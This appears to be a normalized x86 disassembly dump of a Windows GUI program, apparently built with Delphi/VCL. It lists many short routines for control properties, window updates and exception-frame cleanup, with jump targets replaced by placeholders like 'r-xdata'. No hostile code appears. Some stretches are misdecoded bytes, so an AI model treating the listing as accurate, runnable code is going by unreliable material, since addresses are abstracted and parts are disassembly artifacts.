call sub_4032f4
pop esi
retn
sub_435973
jmp sub_403834
sub_435a1c
push esi
mov si 0xffee
call sub_4032f4
pop esi
retn
sub_435a28
mov al 0x1
retn
sub_435d00
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_4340e4
retn
sub_435d24
retn
sub_435f3d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_4170f0
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_435f58
mov al [ eax + 0x5e ]
xchg edx eax
call sub_419428
retn
sub_436050
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_436668
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436670
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436678
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436730
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436750
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_434be0
mov [ ebx + 0x9a ] 0x1
sub_4367a8
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_434b84
mov [ ebx + 0x56 ] 0x1
sub_4367cc
mov [ edx + 0xc ] 0x1
retn
sub_4367d4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_435c5c
sub_4367ec
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_435c5c
sub_436804
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_436a6a
jmp sub_403834
sub_436a71
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436a9c
mov eax [ r-xdata ]
retn
sub_436c38
jmp sub_403834
sub_436c3f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436d60
mov eax [ eax + 0xb8 ]
retn
sub_436dc8
push ebx
mov ebx eax
mov eax ebx
call sub_4350ec
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_436de4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_436f7c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_436fac
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_436fb4
call sub_433b50
retn
sub_4370b4
jmp sub_403834
sub_437274
jmp sub_403834
sub_4372c4
jmp sub_403834
sub_4372fc
retn
sub_437585
jmp sub_403834
sub_43770d
jmp sub_403834
sub_437a6f
jmp sub_403834
sub_437b1b
jmp sub_403834
sub_437b28
inc [ eax + 0x160 ]
retn
sub_437b30
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_437b50
sub_437b50
xor edx edx
call sub_437a94
retn
sub_437c1d
jmp sub_403834
sub_437c24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437d13
jmp sub_403834
sub_43823a
jmp sub_403834
sub_438241
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438409
jmp sub_403834
sub_438410
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4384e4
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4386d1
jmp sub_403834
sub_4386d8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4387c8
xor eax eax
retn
sub_438830
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_435c5c
sub_43895e
jmp sub_403580
sub_438a93
jmp sub_403834
sub_438a9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438aa4
jmp sub_403580
sub_438aa9
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4544c0
call sub_4038e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439064
jmp sub_403834
sub_43906b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439074
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_439572
jmp sub_403834
sub_4395c4
push ebx
mov ebx eax
call sub_41c37c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_435c5c
pop ebx
retn
sub_4395e0
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_435c5c
retn
sub_4395f4
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_435c5c
retn
sub_439604
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_435c5c
retn
sub_4398b0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43b5a0
pop esi
retn
sub_4399c4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_439a14
pop esi
retn
sub_4399d8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_439b00
pop esi
retn
sub_4399ec
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_439a00
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_439af3
jmp sub_403834
sub_439afa
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439b8a
jmp sub_403834
sub_439b91
pop ebx
pop ecx
pop ebp
retn
sub_439b98
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_439ba8
retn
sub_439bac
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_439bcc
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_439d2c
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_439dfc
retn
sub_439f14
jmp sub_403834
sub_439f1b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439fe6
jmp sub_403834
sub_43a010
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_43a0a2
jmp sub_403834
sub_43a274
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_43a518
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_43a5f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_438020
pop esi
retn
sub_43a6b8
push esi
mov si 0xffc1
call sub_4032f4
pop esi
retn
sub_43a6e4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43a6f8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43a70c
call sub_437fe0
retn
sub_43a714
call sub_437fe0
retn
sub_43a71c
call sub_437fe0
retn
sub_43a7c4
push ebx
mov ebx eax
mov eax ebx
call sub_436678
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41d4f4
mov dx 0xb009
mov eax ebx
call sub_438020
pop ebx
retn
sub_43a928
call sub_437fe0
retn
sub_43a930
call sub_437fe0
retn
sub_43a938
call sub_437fe0
retn
sub_43a940
call sub_437fe0
retn
sub_43a9a4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43ae3a
jmp sub_403834
sub_43ae41
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43af20
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_43b0c4
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_435c5c
retn
sub_43b164
push ebx
mov ebx eax
mov eax ebx
call sub_43b594
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_43b180
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_43b358
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_43b290
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_43b3b0
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435c5c
sub_43b3d0
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_435c5c
sub_43b3f4
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_43b400
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_435c5c
sub_43b4ac
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_43b450
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_43b588
jmp sub_403834
sub_43b58f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b7ae
jmp sub_403834
sub_43b7b5
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43b8bc
call sub_435a2c
retn
sub_43bd0a
jmp sub_403834
sub_43bda0
mov eax [ r-xdata ]
retn
sub_43bf07
jmp sub_403834
sub_43c018
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435c5c
sub_43c32e
jmp sub_403834
sub_43c470
test [ eax + 0x52 ] 0x4
setne al
retn
sub_43c5cc
jmp sub_403834
sub_43c5d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41dab4
retn
sub_43c5ef
jmp sub_403834
sub_43c5fc
retn
sub_43c6d0
mov [ edx + 0xc ] 0xffffffff
retn
sub_43c72e
jmp sub_403834
sub_43c735
pop ecx
pop ecx
pop ebp
retn
sub_43c7d5
jmp sub_403834
sub_43c7dc
pop ebx
mov esp ebp
pop ebp
retn
sub_43c848
call sub_4387e8
retn
sub_43c8db
jmp sub_403834
sub_43c8e2
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_43cac1
jmp sub_403834
sub_43cac8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cce4
jmp sub_403834
sub_43cd38
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_43cc24
sub_43ce7c
push ebx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_43ce94
push ebx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_43cf80
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_439420
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_43d01b
jmp sub_403834
sub_43d022
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d045
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41dab4
retn
sub_43d03e
jmp sub_403834
sub_43d045
pop ebx
pop ecx
pop ebp
retn
sub_43d04c
retn
sub_43d0b4
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_43d421
jmp sub_403834
sub_43d608
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_43d7f4
jmp sub_403834
sub_43d8a4
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_43d8b8
inc [ eax + 0x6c ]
retn
sub_43d8bc
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_43f13c
sub_43da1c
call sub_43e11c
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_43e3c7
jmp sub_403834
sub_43e3ce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e3eb
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
sub_43e3e4
jmp sub_403834
sub_43e3eb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e6cc
jmp sub_403834
sub_43e6d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e6f0
mov eax [ ebp - 0x4 ]
call sub_41dab4
retn
sub_43e6e9
jmp sub_403834
sub_43e6f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e70d
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
sub_43e706
jmp sub_403834
sub_43e70d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ebc1
jmp sub_403834
sub_43ebc8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ed53
jmp sub_403834
sub_43ed5a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ee0f
jmp sub_403834
sub_43ee16
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ef04
jmp sub_403834
sub_43ef55
jmp sub_403834
sub_43ef5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f018
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d928
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_43f164
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_43d464
sub_43fa64
jmp sub_403834
sub_43fa6b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fb34
call GetCapture
retn
sub_43fb3c
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c7c0
pop ebx
retn
sub_43fb4c
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_43fdb2
jmp sub_403834
sub_43ffac
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_4401c0
jmp sub_403834
sub_4401c7
pop ebx
mov esp ebp
pop ebp
retn
sub_440273
jmp sub_403834
sub_44027a
pop ebp
retn
sub_440302
jmp sub_403834
sub_440309
pop ebp
retn
sub_440878
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413a50
retn
sub_440890
mov al 0x1
retn
sub_440894
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41a10c
retn
mov eax edx
retn
sub_4408a4
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41a0dc
retn
mov al 0x1
retn
sub_440b94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4139f4
pop esi
pop ebx
retn
sub_440ba8
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_440be4
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_440da8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440dbc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440dd0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440de4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440df8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440e0c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440e20
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440e34
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440e48
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440e5c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403284
pop ebx
retn
sub_440e70
retn
sub_440e74
retn
sub_440e78
retn
sub_440e7c
retn
sub_440e80
retn
sub_440e84
retn
sub_440e88
retn
sub_440e8c
retn
sub_440e90
retn
sub_440e94
retn
sub_440e98
retn
sub_440e9c
retn
sub_441148
jmp sub_403834
sub_4414e4
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x90 ] eax
sub_44150c
push esi
mov si 0xffef
call sub_4032f4
pop esi
retn
sub_4415ad
jmp sub_403834
sub_4415b4
pop ebp
retn
sub_4415b8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
sub_441758
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_4418dd
jmp sub_403834
sub_4418e4
pop ebx
pop ecx
pop ebp
retn
sub_4418e8
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_4418f0
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_441ac0
sub_44199d
jmp sub_403834
sub_4419a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4030f8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_441b53
jmp sub_403834
sub_441b5a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441bf2
jmp sub_403834
sub_441bf9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441c16
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
sub_441c0f
jmp sub_403834
sub_441c16
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4032f4
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441ccf
jmp sub_403834
sub_441cd6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441cdc
or edx 0xffffffff
call sub_441c50
retn
sub_4420eb
jmp sub_403834
sub_4420f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44210f
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
sub_442108
jmp sub_403834
sub_44210f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44212c
mov eax [ ebp - 0x4 ]
call sub_442c24
retn
sub_442125
jmp sub_403834
sub_44212c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442330
jmp sub_403834
sub_442337
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44233c
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_4032f4
sub_442354
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412598
pop ebx
retn
sub_4423f8
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413898
sub_44250f
jmp sub_403834
sub_442516
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f8
retn
sub_44252c
jmp sub_403834
sub_44283e
jmp sub_403834
sub_442845
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442862
mov eax [ ebp - 0x10 ]
call sub_4030f8
retn
sub_44285b
jmp sub_403834
sub_442862
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44287f
mov eax [ ebp - 0x8 ]
call sub_4030f8
retn
sub_442878
jmp sub_403834
sub_44287f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4428e8
jmp sub_403834
sub_442a01
jmp sub_403834
sub_442a1e
jmp sub_403834
sub_442bd6
jmp sub_403834
sub_442bdd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442c20
inc [ eax + 0x5c ]
retn
sub_442c24
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_4032f4
sub_442c78
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_442cb5
jmp sub_403834
sub_442cbc
pop ebp
retn
sub_442cc0
sub [ rw-data ] 0x1
retn
sub_443bcb
jmp [ eax + eax ]
sub_443c28
mov eax [ esp + 0x8 ]
retn
sub_443c30
push ebx
mov ebx eax
call sub_443c28
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
jmp sub_40386c
sub_443c4c
pop ebx
retn
sub_443ec5
jmp sub_403834
sub_443ecc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444017
jmp sub_403834
sub_44401e
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444034
push ebx
mov eax [ rw-data ]
call sub_413f88
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_413f5c
mov eax ebx
pop ebx
retn
sub_4441bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4441d8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_4448d3
jmp sub_403834
sub_4448da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4449d2
jmp sub_403834
sub_4449d9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444dfc
jmp sub_403834
sub_444e03
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4452af
jmp sub_403834
sub_445750
jmp sub_403834
sub_445757
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445bbb
jmp sub_403834
sub_446078
jmp sub_403834
sub_44607f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44642a
jmp sub_403834
sub_446431
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44643f
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4465ec
mov eax [ r-xdata ]
retn
sub_446628
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44663c
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44664c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44665c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_446958
mov edx eax
sub_4466f4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032a8
mov edx esi
call sub_446674
pop esi
pop ebx
retn
sub_446770
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_446958
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413a50
mov ecx eax
sub_446b48
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_446bb0
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_446f58
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_446f8c
sub_446f8c
mov edx sub_446f64
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_4440b4
retn
sub_447176
jmp sub_403834
sub_44717d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447614
jmp sub_403834
sub_447653
jmp sub_403834
sub_44765a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4477f8
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_447934
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_4032f4
pop esi
pop ebp
retn 0x8
sub_447950
mov eax [ eax + 0x34 ]
call sub_444b88
retn
sub_44795c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_4032f4
pop esi
retn
sub_447998
push ebx
mov ecx sub_447970
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
